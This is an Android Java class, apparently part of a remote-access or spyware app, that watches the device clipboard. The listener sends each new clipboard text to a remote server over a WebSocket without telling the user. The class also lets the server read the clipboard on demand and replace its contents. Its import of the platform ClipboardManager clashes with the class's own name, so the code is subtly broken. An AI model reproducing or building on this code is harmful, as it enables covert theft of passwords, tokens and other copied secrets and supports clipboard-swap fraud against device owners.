package com.xrc.system.features;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class ClipboardManager {
    private static final String TAG = Constants.TAG + ":Clip";
    private static ClipboardManager instance;
    private final Context ctx;
    private final android.content.ClipboardManager cm;
    private String lastClip = "";

    private ClipboardManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.cm = (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm != null) {
            cm.addPrimaryClipChangedListener(() -> {
                String text = readText();
                if (text != null && !text.equals(lastClip)) {
                    lastClip = text;
                    sendClipEvent(text);
                }
            });
        }
    }

    public static synchronized ClipboardManager get(Context ctx) {
        if (instance == null) {
            instance = new ClipboardManager(ctx);
        }
        return instance;
    }

    public String readText() {
        if (cm == null || !cm.hasPrimaryClip()) return "";
        ClipData clip = cm.getPrimaryClip();
        if (clip == null || clip.getItemCount() == 0) return "";
        CharSequence text = clip.getItemAt(0).getText();
        return text != null ? text.toString() : "";
    }

    public void setText(String text) {
        if (cm == null) return;
        ClipData clip = ClipData.newPlainText("xrc", text);
        cm.setPrimaryClip(clip);
        lastClip = text;
    }

    public void readAndSend() {
        String text = readText();
        try {
            JSONObject data = new JSONObject();
            data.put("text", text);
            data.put("ts", System.currentTimeMillis());
            WebSocketClient.get(ctx).sendEvent("clipboard", data);
        } catch (JSONException e) {
            Log.e(TAG, "Clipboard send failed", e);
        }
    }

    private void sendClipEvent(String text) {
        try {
            JSONObject data = new JSONObject();
            data.put("text", text);
            data.put("ts", System.currentTimeMillis());
            data.put("auto", true);
            WebSocketClient.get(ctx).sendEvent("clipboard_change", data);
        } catch (JSONException e) {
            Log.e(TAG, "Clip event failed", e);
        }
    }
}
